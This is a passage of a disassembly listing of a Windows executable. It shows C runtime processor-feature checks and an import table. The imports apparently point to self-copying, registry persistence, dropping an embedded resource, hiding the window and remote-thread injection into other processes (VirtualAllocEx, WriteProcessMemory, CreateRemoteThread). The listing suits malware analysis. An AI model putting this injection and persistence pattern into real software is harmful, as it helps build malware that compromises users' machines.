.text:00401D8D                 or      eax, [ebp+var_14]
.text:00401D90                 or      eax, edi
.text:00401D92                 mov     [ebx+4], esi
.text:00401D95                 mov     [ebx+8], ecx
.text:00401D98                 mov     [ebx+0Ch], edx
.text:00401D9B                 jnz     short loc_401DD6
.text:00401D9D                 mov     eax, [ebp+var_28]
.text:00401DA0                 and     eax, 0FFF3FF0h
.text:00401DA5                 cmp     eax, 106C0h
.text:00401DAA                 jz      short loc_401DCF
.text:00401DAC                 cmp     eax, 20660h
.text:00401DB1                 jz      short loc_401DCF
.text:00401DB3                 cmp     eax, 20670h
.text:00401DB8                 jz      short loc_401DCF
.text:00401DBA                 cmp     eax, 30650h
.text:00401DBF                 jz      short loc_401DCF
.text:00401DC1                 cmp     eax, 30660h
.text:00401DC6                 jz      short loc_401DCF
.text:00401DC8                 cmp     eax, 30670h
.text:00401DCD                 jnz     short loc_401DD6
.text:00401DCF
.text:00401DCF loc_401DCF:                             ; CODE XREF: sub_401D14+96↑j
.text:00401DCF                                         ; sub_401D14+9D↑j ...
.text:00401DCF                 or      dword_4053BC, 1
.text:00401DD6
.text:00401DD6 loc_401DD6:                             ; CODE XREF: sub_401D14+87↑j
.text:00401DD6                                         ; sub_401D14+B9↑j
.text:00401DD6                 mov     edx, [ebp+var_20]
.text:00401DD9                 xor     ebx, ebx
.text:00401DDB                 and     [ebp+var_14], ebx
.text:00401DDE                 xor     edi, edi
.text:00401DE0                 and     [ebp+var_18], ebx
.text:00401DE3                 cmp     [ebp+var_4], 7
.text:00401DE7                 mov     [ebp+var_C], edx
.text:00401DEA                 jl      loc_401E77
.text:00401DF0                 push    7
.text:00401DF2                 pop     eax
.text:00401DF3                 xor     ecx, ecx
.text:00401DF5                 push    ebx
.text:00401DF6                 cpuid
.text:00401DF8                 mov     esi, ebx
.text:00401DFA                 pop     ebx
.text:00401DFB                 nop
.text:00401DFC                 lea     ebx, [ebp+var_28]
.text:00401DFF                 mov     [ebx], eax
.text:00401E01                 mov     [ebx+4], esi
.text:00401E04                 mov     [ebx+8], ecx
.text:00401E07                 mov     [ebx+0Ch], edx
.text:00401E0A                 mov     ebx, [ebp+var_24]
.text:00401E0D                 mov     eax, [ebp+var_1C]
.text:00401E10                 mov     [ebp+var_8], ebx
.text:00401E13                 mov     [ebp+var_14], eax
.text:00401E16                 test    ebx, 200h
.text:00401E1C                 jz      short loc_401E25
.text:00401E1E                 or      dword_4053BC, 2
.text:00401E25
.text:00401E25 loc_401E25:                             ; CODE XREF: sub_401D14+108↑j
.text:00401E25                 cmp     [ebp+var_28], 1
.text:00401E29                 jl      short loc_401E4F
.text:00401E2B                 push    7
.text:00401E2D                 pop     eax
.text:00401E2E                 xor     ecx, ecx
.text:00401E30                 inc     ecx
.text:00401E31                 push    ebx
.text:00401E32                 cpuid
.text:00401E34                 mov     esi, ebx
.text:00401E36                 pop     ebx
.text:00401E37                 nop
.text:00401E38                 lea     ebx, [ebp+var_28]
.text:00401E3B                 mov     [ebx], eax
.text:00401E3D                 mov     [ebx+4], esi
.text:00401E40                 mov     [ebx+8], ecx
.text:00401E43                 mov     [ebx+0Ch], edx
.text:00401E46                 mov     eax, [ebp+var_1C]
.text:00401E49                 mov     ebx, [ebp+var_8]
.text:00401E4C                 mov     [ebp+var_18], eax
.text:00401E4F
.text:00401E4F loc_401E4F:                             ; CODE XREF: sub_401D14+115↑j
.text:00401E4F                 push    24h ; '$'
.text:00401E51                 pop     eax
.text:00401E52                 cmp     [ebp+var_4], eax
.text:00401E55                 jl      short loc_401E74
.text:00401E57                 xor     ecx, ecx
.text:00401E59                 lea     edi, [ebp+var_28]
.text:00401E5C                 push    ebx
.text:00401E5D                 cpuid
.text:00401E5F                 mov     esi, ebx
.text:00401E61                 pop     ebx
.text:00401E62                 nop
.text:00401E63                 mov     ebx, [ebp+var_8]
.text:00401E66                 mov     [edi], eax
.text:00401E68                 mov     [edi+4], esi
.text:00401E6B                 mov     [edi+8], ecx
.text:00401E6E                 mov     [edi+0Ch], edx
.text:00401E71                 mov     edi, [ebp+var_24]
.text:00401E74
.text:00401E74 loc_401E74:                             ; CODE XREF: sub_401D14+141↑j
.text:00401E74                 mov     edx, [ebp+var_C]
.text:00401E77
.text:00401E77 loc_401E77:                             ; CODE XREF: sub_401D14+D6↑j
.text:00401E77                 mov     eax, dword_405058
.text:00401E7C                 mov     ecx, dword_405050
.text:00401E82                 or      eax, 2
.text:00401E85                 mov     esi, dword_405054
.text:00401E8B                 and     ecx, 0FFFFFFFEh
.text:00401E8E                 mov     dword_4053B8, 1
.text:00401E98                 mov     dword_405058, eax
.text:00401E9D                 mov     dword_405050, ecx
.text:00401EA3                 mov     dword_405054, esi
.text:00401EA9                 test    edx, 100000h
.text:00401EAF                 jz      loc_40203A
.text:00401EB5                 or      eax, 4
.text:00401EB8                 mov     dword_4053B8, 2
.text:00401EC2                 and     ecx, 0FFFFFFEFh
.text:00401EC5                 mov     dword_405058, eax
.text:00401ECA                 mov     dword_405050, ecx
.text:00401ED0                 mov     dword_405054, esi
.text:00401ED6                 test    edx, 8000000h
.text:00401EDC                 jz      loc_40203A
.text:00401EE2                 test    edx, 10000000h
.text:00401EE8                 jz      loc_40203A
.text:00401EEE                 xor     ecx, ecx
.text:00401EF0                 xgetbv
.text:00401EF3                 mov     [ebp+var_10], eax
.text:00401EF6                 xor     esi, esi
.text:00401EF8                 mov     [ebp+var_C], edx
.text:00401EFB                 mov     eax, [ebp+var_10]
.text:00401EFE                 mov     ecx, [ebp+var_C]
.text:00401F01                 and     eax, 6
.text:00401F04                 and     ecx, esi
.text:00401F06                 cmp     eax, 6
.text:00401F09                 jnz     loc_40203A
.text:00401F0F                 cmp     ecx, esi
.text:00401F11                 jnz     loc_40203A
.text:00401F17                 mov     eax, dword_405058
.text:00401F1C                 or      eax, 8
.text:00401F1F                 mov     dword_4053B8, 3
.text:00401F29                 mov     dword_405058, eax
.text:00401F2E                 test    bl, 20h
.text:00401F31                 jz      short loc_401FAC
.text:00401F33                 mov     ecx, dword_405054
.text:00401F39                 or      eax, 20h
.text:00401F3C                 mov     dword_405058, eax
.text:00401F41                 mov     edx, 0D0030000h
.text:00401F46                 mov     eax, dword_405050
.text:00401F4B                 and     ebx, edx
.text:00401F4D                 and     eax, 0FFFFFFFDh
.text:00401F50                 mov     dword_4053B8, 5
.text:00401F5A                 mov     dword_405050, eax
.text:00401F5F                 mov     dword_405054, ecx
.text:00401F65                 cmp     ebx, edx
.text:00401F67                 jnz     short loc_401FB7
.text:00401F69                 mov     eax, [ebp+var_10]
.text:00401F6C                 mov     edx, 0E0h
.text:00401F71                 mov     ecx, [ebp+var_C]
.text:00401F74                 and     eax, edx
.text:00401F76                 and     ecx, esi
.text:00401F78                 cmp     eax, edx
.text:00401F7A                 jnz     short loc_401FAC
.text:00401F7C                 cmp     ecx, esi
.text:00401F7E                 jnz     short loc_401FAC
.text:00401F80                 mov     eax, dword_405050
.text:00401F85                 or      dword_405058, 40h
.text:00401F8C                 and     eax, 0FFFFFFDBh
.text:00401F8F                 mov     ecx, dword_405054
.text:00401F95                 mov     dword_4053B8, 6
.text:00401F9F                 mov     dword_405050, eax
.text:00401FA4                 mov     dword_405054, ecx
.text:00401FAA                 jmp     short loc_401FB7
.text:00401FAC ; ---------------------------------------------------------------------------
.text:00401FAC
.text:00401FAC loc_401FAC:                             ; CODE XREF: sub_401D14+21D↑j
.text:00401FAC                                         ; sub_401D14+266↑j ...
.text:00401FAC                 mov     ecx, dword_405054
.text:00401FB2                 mov     eax, dword_405050
.text:00401FB7
.text:00401FB7 loc_401FB7:                             ; CODE XREF: sub_401D14+253↑j
.text:00401FB7                                         ; sub_401D14+296↑j
.text:00401FB7                 test    [ebp+var_14], 800000h
.text:00401FBE                 jz      short loc_401FD0
.text:00401FC0                 and     eax, 0FEFFFFFFh
.text:00401FC5                 mov     dword_405054, ecx
.text:00401FCB                 mov     dword_405050, eax
.text:00401FD0
.text:00401FD0 loc_401FD0:                             ; CODE XREF: sub_401D14+2AA↑j
.text:00401FD0                 test    [ebp+var_18], 80000h
.text:00401FD7                 jz      short loc_40203A
.text:00401FD9                 mov     eax, [ebp+var_10]
.text:00401FDC                 mov     edx, 0E0h
.text:00401FE1                 mov     ecx, [ebp+var_C]
.text:00401FE4                 and     eax, edx
.text:00401FE6                 and     ecx, esi
.text:00401FE8                 cmp     eax, edx
.text:00401FEA                 jnz     short loc_40203A
.text:00401FEC                 cmp     ecx, esi
.text:00401FEE                 jnz     short loc_40203A
.text:00401FF0                 mov     eax, edi
.text:00401FF2                 xor     ecx, ecx
.text:00401FF4                 shr     edi, 10h
.text:00401FF7                 and     eax, 400FFh
.text:00401FFC                 and     edi, 7
.text:00401FFF                 mov     dword_4053B4, eax
.text:00402004                 or      edi, 1000028h
.text:0040200A                 not     ecx
.text:0040200C                 and     ecx, dword_405054
.text:00402012                 not     edi
.text:00402014                 and     edi, dword_405050
.text:0040201A                 mov     dword_405050, edi
.text:00402020                 mov     dword_405054, ecx
.text:00402026                 cmp     eax, 1
.text:00402029                 jbe     short loc_40203A
.text:0040202B                 and     edi, 0FFFFFFBFh
.text:0040202E                 mov     dword_405054, ecx
.text:00402034                 mov     dword_405050, edi
.text:0040203A
.text:0040203A loc_40203A:                             ; CODE XREF: sub_401D14+19B↑j
.text:0040203A                                         ; sub_401D14+1C8↑j ...
.text:0040203A                 pop     edi
.text:0040203B                 pop     esi
.text:0040203C                 pop     ebx
.text:0040203D
.text:0040203D loc_40203D:                             ; CODE XREF: sub_401D14+1E↑j
.text:0040203D                 xor     eax, eax
.text:0040203F                 leave
.text:00402040                 retn
.text:00402040 sub_401D14      endp
.text:00402040
.text:00402041 ; [0000000C BYTES: COLLAPSED FUNCTION ___scrt_is_ucrt_dll_in_use]
.text:0040204D ; [00000006 BYTES: COLLAPSED FUNCTION __current_exception]
.text:00402053 ; [00000006 BYTES: COLLAPSED FUNCTION __current_exception_context]
.text:00402059 ; [00000006 BYTES: COLLAPSED FUNCTION memset]
.text:0040205F ; [00000006 BYTES: COLLAPSED FUNCTION _except_handler4_common]
.text:00402065 ; [00000006 BYTES: COLLAPSED FUNCTION _seh_filter_exe]
.text:0040206B ; [00000006 BYTES: COLLAPSED FUNCTION _set_app_type]
.text:00402071 ; [00000006 BYTES: COLLAPSED FUNCTION __setusermatherr]
.text:00402077 ; [00000006 BYTES: COLLAPSED FUNCTION _configure_narrow_argv]
.text:0040207D ; [00000006 BYTES: COLLAPSED FUNCTION _initialize_narrow_environment]
.text:00402083 ; [00000006 BYTES: COLLAPSED FUNCTION _get_initial_narrow_environment]
.text:00402089 ; [00000006 BYTES: COLLAPSED FUNCTION _initterm]
.text:0040208F ; [00000006 BYTES: COLLAPSED FUNCTION _initterm_e]
.text:00402095 ; [00000006 BYTES: COLLAPSED FUNCTION exit]
.text:0040209B ; [00000006 BYTES: COLLAPSED FUNCTION _exit]
.text:004020A1 ; [00000006 BYTES: COLLAPSED FUNCTION _set_fmode]
.text:004020A7 ; [00000006 BYTES: COLLAPSED FUNCTION __p___argc]
.text:004020AD ; [00000006 BYTES: COLLAPSED FUNCTION __p___argv]
.text:004020B3 ; [00000006 BYTES: COLLAPSED FUNCTION _cexit]
.text:004020B9 ; [00000006 BYTES: COLLAPSED FUNCTION _c_exit]
.text:004020BF ; [00000006 BYTES: COLLAPSED FUNCTION _register_thread_local_exe_atexit_callback]
.text:004020C5 ; [00000006 BYTES: COLLAPSED FUNCTION _configthreadlocale]
.text:004020CB ; [00000006 BYTES: COLLAPSED FUNCTION _set_new_mode]
.text:004020D1 ; [00000006 BYTES: COLLAPSED FUNCTION __p__commode]
.text:004020D7 ; [00000006 BYTES: COLLAPSED FUNCTION _initialize_onexit_table]
.text:004020DD ; [00000006 BYTES: COLLAPSED FUNCTION _register_onexit_function]
.text:004020E3 ; [00000006 BYTES: COLLAPSED FUNCTION _crt_atexit]
.text:004020E9 ; [00000006 BYTES: COLLAPSED FUNCTION _controlfp_s]
.text:004020EF ; [00000006 BYTES: COLLAPSED FUNCTION terminate]
.text:004020F5 ; [00000078 BYTES: COLLAPSED FUNCTION __filter_x86_sse2_floating_point_exception_default]
.text:0040216D                 align 100h
.text:00402200                 dd 380h dup(?)
.text:00402200 _text           ends
.text:00402200
.idata:00403000 ; Section 2. (virtual address 00003000)
.idata:00403000 ; Virtual size                  : 00001130 (   4400.)
.idata:00403000 ; Section size in file          : 00001200 (   4608.)
.idata:00403000 ; Offset to raw data for section: 00001600
.idata:00403000 ; Flags 40000040: Data Readable
.idata:00403000 ; Alignment     : default
.idata:00403000 ;
.idata:00403000 ; Imports from ADVAPI32.dll
.idata:00403000 ;
.idata:00403000 ; ===========================================================================
.idata:00403000
.idata:00403000 ; Segment type: Externs
.idata:00403000 ; _idata
.idata:00403000 ; LSTATUS (__stdcall *RegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData)
.idata:00403000                 extrn RegSetValueExW:dword ; CODE XREF: _main+FE↑p
.idata:00403000                                         ; DATA XREF: _main+FE↑r ...
.idata:00403000                                         ; ADVAPI32
.idata:00403004 ; LSTATUS (__stdcall *RegOpenKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
.idata:00403004                 extrn RegOpenKeyExW:dword ; CODE XREF: _main+DD↑p
.idata:00403004                                         ; DATA XREF: _main+DD↑r
.idata:00403004                                         ; ADVAPI32
.idata:00403008 ; LSTATUS (__stdcall *RegCloseKey)(HKEY hKey)
.idata:00403008                 extrn RegCloseKey:dword ; CODE XREF: _main+10A↑p
.idata:00403008                                         ; DATA XREF: _main+10A↑r
.idata:00403008                                         ; ADVAPI32
.idata:0040300C
.idata:00403010 ;
.idata:00403010 ; Imports from KERNEL32.DLL
.idata:00403010 ;
.idata:00403010 ; HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
.idata:00403010                 extrn CreateFileW:dword ; CODE XREF: _main+1CB↑p
.idata:00403010                                         ; DATA XREF: _main+1CB↑r ...
.idata:00403010                                         ; KERNEL32
.idata:00403014 ; HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
.idata:00403014                 extrn OpenProcess:dword ; CODE XREF: _main+2D7↑p
.idata:00403014                                         ; DATA XREF: _main+2D7↑r
.idata:00403014                                         ; KERNEL32
.idata:00403018 ; BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes)
.idata:00403018                 extrn SetFileAttributesW:dword
.idata:00403018                                         ; CODE XREF: _main+4F↑p
.idata:00403018                                         ; DATA XREF: _main+4F↑r
.idata:00403018                                         ; KERNEL32
.idata:0040301C ; HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID)
.idata:0040301C                 extrn CreateToolhelp32Snapshot:dword
.idata:0040301C                                         ; CODE XREF: _main+25F↑p
.idata:0040301C                                         ; DATA XREF: _main+25F↑r
.idata:0040301C                                         ; KERNEL32
.idata:00403020 ; BOOL (__stdcall *Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe)
.idata:00403020                 extrn Process32NextW:dword
.idata:00403020                                         ; CODE XREF: _main+2AD↑p
.idata:00403020                                         ; DATA XREF: _main+27F↑r
.idata:00403020                                         ; KERNEL32
.idata:00403024 ; LPVOID (__stdcall *LockResource)(HGLOBAL hResData)
.idata:00403024                 extrn LockResource:dword ; CODE XREF: _main+16B↑p
.idata:00403024                                         ; DATA XREF: _main+16B↑r
.idata:00403024                                         ; KERNEL32
.idata:00403028 ; BOOL (__stdcall *Process32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe)
.idata:00403028                 extrn Process32FirstW:dword
.idata:00403028                                         ; CODE XREF: _main+26F↑p
.idata:00403028                                         ; DATA XREF: _main+26F↑r
.idata:00403028                                         ; KERNEL32
.idata:0040302C ; BOOL (__stdcall *CloseHandle)(HANDLE hObject)
.idata:0040302C                 extrn CloseHandle:dword ; CODE XREF: _main+1FF↑p
.idata:0040302C                                         ; _main+2C8↑p ...
.idata:0040302C                                         ; KERNEL32
.idata:00403030 ; HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo)
.idata:00403030                 extrn LoadResource:dword ; CODE XREF: _main+13D↑p
.idata:00403030                                         ; DATA XREF: _main+13D↑r
.idata:00403030                                         ; KERNEL32
.idata:00403034 ; HRSRC (__stdcall *FindResourceW)(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType)
.idata:00403034                 extrn FindResourceW:dword ; CODE XREF: _main+116↑p
.idata:00403034                                         ; DATA XREF: _main+116↑r
.idata:00403034                                         ; KERNEL32
.idata:00403038 ; DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize)
.idata:00403038                 extrn GetModuleFileNameW:dword
.idata:00403038                                         ; CODE XREF: _main+40↑p
.idata:00403038                                         ; DATA XREF: _main+40↑r
.idata:00403038                                         ; KERNEL32
.idata:0040303C ; LPVOID (__stdcall *VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
.idata:0040303C                 extrn VirtualAllocEx:dword
.idata:0040303C                                         ; CODE XREF: _main+2EB↑p
.idata:0040303C                                         ; DATA XREF: _main+2EB↑r
.idata:0040303C                                         ; KERNEL32
.idata:00403040 ; HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName)
.idata:00403040                 extrn GetModuleHandleW:dword
.idata:00403040                                         ; CODE XREF: _main+309↑p
.idata:00403040                                         ; ___scrt_is_managed_app+2↑p
.idata:00403040                                         ; DATA XREF: ...
.idata:00403040                                         ; KERNEL32
.idata:00403044 ; BOOL (__stdcall *CopyFileW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, BOOL bFailIfExists)
.idata:00403044                 extrn CopyFileW:dword   ; CODE XREF: _main+98↑p
.idata:00403044                                         ; DATA XREF: _main+98↑r
.idata:00403044                                         ; KERNEL32
.idata:00403048 ; HANDLE (__stdcall *CreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
.idata:00403048                 extrn CreateRemoteThread:dword
.idata:00403048                                         ; CODE XREF: _main+326↑p
.idata:00403048                                         ; DATA XREF: _main+326↑r
.idata:00403048                                         ; KERNEL32
.idata:0040304C ; BOOL (__stdcall *VirtualFreeEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
.idata:0040304C                 extrn VirtualFreeEx:dword ; CODE XREF: _main+338↑p
.idata:0040304C                                         ; DATA XREF: _main+338↑r
.idata:0040304C                                         ; KERNEL32
.idata:00403050 ; BOOL (__stdcall *AllocConsole)()
.idata:00403050                 extrn AllocConsole:dword ; CODE XREF: _main+16↑p
.idata:00403050                                         ; DATA XREF: _main+16↑r
.idata:00403050                                         ; KERNEL32
.idata:00403054 ; BOOL (__stdcall *IsDebuggerPresent)()
.idata:00403054                 extrn IsDebuggerPresent:dword
.idata:00403054                                         ; CODE XREF: ___scrt_fastfail+D8↑p
.idata:00403054                                         ; DATA XREF: ___scrt_fastfail+D8↑r
.idata:00403054                                         ; KERNEL32
.idata:00403058 ; void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead)
.idata:00403058                 extrn InitializeSListHead:dword
.idata:00403058                                         ; CODE XREF: sub_401A0C+5↑p
.idata:00403058                                         ; DATA XREF: sub_401A0C+5↑r
.idata:00403058                                         ; KERNEL32
.idata:0040305C ; void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime)
.idata:0040305C                 extrn GetSystemTimeAsFileTime:dword
.idata:0040305C                                         ; CODE XREF: ___get_entropy+12↑p
.idata:0040305C                                         ; DATA XREF: ___get_entropy+12↑r
.idata:0040305C                                         ; KERNEL32
.idata:00403060 ; DWORD (__stdcall *GetCurrentThreadId)()
.idata:00403060                 extrn GetCurrentThreadId:dword
.idata:00403060                                         ; CODE XREF: ___get_entropy+21↑p
.idata:00403060                                         ; DATA XREF: ___get_entropy+21↑r
.idata:00403060                                         ; KERNEL32
.idata:00403064 ; BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
.idata:00403064                 extrn WriteFile:dword   ; CODE XREF: _main+1F8↑p
.idata:00403064                                         ; DATA XREF: _main+1F8↑r
.idata:00403064                                         ; KERNEL32
.idata:00403068 ; BOOL (__stdcall *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)
.idata:00403068                 extrn WriteProcessMemory:dword
.idata:00403068                                         ; CODE XREF: _main+2FE↑p
.idata:00403068                                         ; DATA XREF: _main+2FE↑r
.idata:00403068                                         ; KERNEL32
.idata:0040306C ; FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
.idata:0040306C                 extrn GetProcAddress:dword
.idata:0040306C                                         ; CODE XREF: _main+315↑p
.idata:0040306C                                         ; DATA XREF: _main+315↑r
.idata:0040306C                                         ; KERNEL32
.idata:00403070 ; DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo)
.idata:00403070                 extrn SizeofResource:dword
.idata:00403070                                         ; CODE XREF: _main+15E↑p
.idata:00403070                                         ; DATA XREF: _main+15E↑r
.idata:00403070                                         ; KERNEL32
.idata:00403074 ; DWORD (__stdcall *GetCurrentProcessId)()
.idata:00403074                 extrn GetCurrentProcessId:dword
.idata:00403074                                         ; CODE XREF: ___get_entropy+2A↑p
.idata:00403074                                         ; DATA XREF: ___get_entropy+2A↑r
.idata:00403074                                         ; KERNEL32
.idata:00403078 ; BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount)
.idata:00403078                 extrn QueryPerformanceCounter:dword
.idata:00403078                                         ; CODE XREF: ___get_entropy+37↑p
.idata:00403078                                         ; DATA XREF: ___get_entropy+37↑r
.idata:00403078                                         ; KERNEL32
.idata:0040307C ; BOOL (__stdcall *IsProcessorFeaturePresent)(DWORD ProcessorFeature)
.idata:0040307C                 extrn IsProcessorFeaturePresent:dword
.idata:0040307C                                         ; CODE XREF: ___report_gsfailure+B↑p
.idata:0040307C                                         ; ___scrt_fastfail+C↑p ...
.idata:0040307C                                         ; KERNEL32
.idata:00403080 ; BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode)
.idata:00403080                 extrn TerminateProcess:dword
.idata:00403080                                         ; CODE XREF: ___raise_securityfailure+20↑p
.idata:00403080                                         ; DATA XREF: ___raise_securityfailure+20↑r
.idata:00403080                                         ; KERNEL32
.idata:00403084 ; HANDLE (__stdcall *GetCurrentProcess)()
.idata:00403084                 extrn GetCurrentProcess:dword
.idata:00403084                                         ; CODE XREF: ___raise_securityfailure+19↑p
.idata:00403084                                         ; DATA XREF: ___raise_securityfailure+19↑r
.idata:00403084                                         ; KERNEL32
.idata:00403088 ; LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
.idata:00403088                 extrn SetUnhandledExceptionFilter:dword
.idata:00403088                                         ; CODE XREF: ___raise_securityfailure+5↑p
.idata:00403088                                         ; ___scrt_fastfail+F1↑p ...
.idata:00403088                                         ; KERNEL32
.idata:0040308C ; LONG (__stdcall *UnhandledExceptionFilter)(struct _EXCEPTION_POINTERS *ExceptionInfo)
.idata:0040308C                 extrn UnhandledExceptionFilter:dword
.idata:0040308C                                         ; CODE XREF: ___raise_securityfailure+E↑p
.idata:0040308C                                         ; ___scrt_fastfail+FB↑p
.idata:0040308C                                         ; DATA XREF: ...
.idata:0040308C                                         ; KERNEL32
.idata:00403090
.idata:00403094 ;
.idata:00403094 ; Imports from SHELL32.dll
.idata:00403094 ;
.idata:00403094 ; HRESULT (__stdcall *SHGetFolderPathW)(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPWSTR pszPath)
.idata:00403094                 extrn SHGetFolderPathW:dword
.idata:00403094                                         ; CODE XREF: _main+6A↑p
.idata:00403094                                         ; _main+AD↑p ...
.idata:00403094                                         ; SHELL32
.idata:00403098 ; HINSTANCE (__stdcall *ShellExecuteW)(HWND hwnd, LPCWSTR lpOperation, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, INT nShowCmd)
.idata:00403098                 extrn ShellExecuteW:dword ; CODE XREF: _main+215↑p
.idata:00403098                                         ; DATA XREF: _main+215↑r
.idata:00403098                                         ; SHELL32
.idata:0040309C
.idata:004030A0 ;
.idata:004030A0 ; Imports from USER32.dll
.idata:004030A0 ;
.idata:004030A0 ; BOOL (__stdcall *ShowWindow)(HWND hWnd, int nCmdShow)
.idata:004030A0                 extrn ShowWindow:dword  ; CODE XREF: _main+2C↑p
.idata:004030A0                                         ; DATA XREF: _main+2C↑r ...
.idata:004030A0                                         ; USER32
.idata:004030A4 ; HWND (__stdcall *FindWindowA)(LPCSTR lpClassName, LPCSTR lpWindowName)
.idata:004030A4                 extrn FindWindowA:dword ; CODE XREF: _main+23↑p
.idata:004030A4                                         ; DATA XREF: _main+23↑r
.idata:004030A4                                         ; USER32
.idata:004030A8
.idata:004030AC ;
.idata:004030AC ; Imports from VCRUNTIME140.dll
.idata:004030AC ;
.idata:004030AC                 extrn __imp___current_exception:dword
.idata:004030AC                                         ; DATA XREF: __current_exception↑r
.idata:004030AC                                         ; .rdata:00403950↓o
.idata:004030AC                                         ; VCRUNTIME140
.idata:004030B0                 extrn __imp___current_exception_context:dword
.idata:004030B0                                         ; DATA XREF: __current_exception_context↑r
.idata:004030B0                                         ; VCRUNTIME140
.idata:004030B4                 extrn __imp__except_handler4_common:dword
.idata:004030B4                                         ; DATA XREF: _except_handler4_common↑r
.idata:004030B4                                         ; VCRUNTIME140
.idata:004030B8 ; void *(__cdecl *memset)(void *, int Val, size_t Size)
.idata:004030B8                 extrn __imp_memset:dword ; DATA XREF: memset↑r
.idata:004030B8                                         ; VCRUNTIME140
.idata:004030BC
.idata:004030C0 ;
.idata:004030C0 ; Imports from api-ms-win-crt-heap-l1-1-0.dll
.idata:004030C0 ;
.idata:004030C0 ; int (__cdecl *_set_new_mode)(int NewMode)
.idata:004030C0                 extrn __imp__set_new_mode:dword
.idata:004030C0                                         ; DATA XREF: _set_new_mode↑r
.idata:004030C0                                         ; .rdata:0040389C↓o
.idata:004030C0                                         ; api-ms-win-crt-heap-l1-1-0
.idata:004030C4
.idata:004030C8 ;
.idata:004030C8 ; Imports from api-ms-win-crt-locale-l1-1-0.dll
.idata:004030C8 ;
.idata:004030C8 ; int (__cdecl *_configthreadlocale)(int Flag)
.idata:004030C8                 extrn __imp__configthreadlocale:dword
.idata:004030C8                                         ; DATA XREF: _configthreadlocale↑r
.idata:004030C8                                         ; .rdata:004038B0↓o
.idata:004030C8                                         ; api-ms-win-crt-locale-l1-1-0
.idata:004030CC
.idata:004030D0 ;
.idata:004030D0 ; Imports from api-ms-win-crt-math-l1-1-0.dll
.idata:004030D0 ;
.idata:004030D0 ; void (__cdecl *__setusermatherr)(_UserMathErrorFunctionPointer UserMathErrorFunction)
.idata:004030D0                 extrn __imp___setusermatherr:dword
.idata:004030D0                                         ; DATA XREF: __setusermatherr↑r
.idata:004030D0                                         ; .rdata:004038C4↓o
.idata:004030D0                                         ; api-ms-win-crt-math-l1-1-0
.idata:004030D4
.idata:004030D8 ;
.idata:004030D8 ; Imports from api-ms-win-crt-runtime-l1-1-0.dll
.idata:004030D8 ;
.idata:004030D8 ; char ***(__cdecl *__p___argv)()
.idata:004030D8                 extrn __imp___p___argv:dword
.idata:004030D8                                         ; DATA XREF: __p___argv↑r
.idata:004030D8                                         ; .rdata:004038D8↓o
.idata:004030D8                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004030DC ; void (__cdecl *_initterm)(_PVFV *First, _PVFV *Last)
.idata:004030DC                 extrn __imp__initterm:dword
.idata:004030DC                                         ; DATA XREF: _initterm↑r
.idata:004030DC                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004030E0 ; void (__cdecl *_c_exit)()
.idata:004030E0                 extrn __imp__c_exit:dword ; DATA XREF: _c_exit↑r
.idata:004030E0                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004030E4 ; void (__cdecl *_register_thread_local_exe_atexit_callback)(_tls_callback_type Callback)
.idata:004030E4                 extrn __imp__register_thread_local_exe_atexit_callback:dword
.idata:004030E4                                         ; DATA XREF: _register_thread_local_exe_atexit_callback↑r
.idata:004030E4                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004030E8 ; int *(__cdecl *__p___argc)()
.idata:004030E8                 extrn __imp___p___argc:dword
.idata:004030E8                                         ; DATA XREF: __p___argc↑r
.idata:004030E8                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004030EC ; char **(__cdecl *_get_initial_narrow_environment)()
.idata:004030EC                 extrn __imp__get_initial_narrow_environment:dword
.idata:004030EC                                         ; DATA XREF: _get_initial_narrow_environment↑r
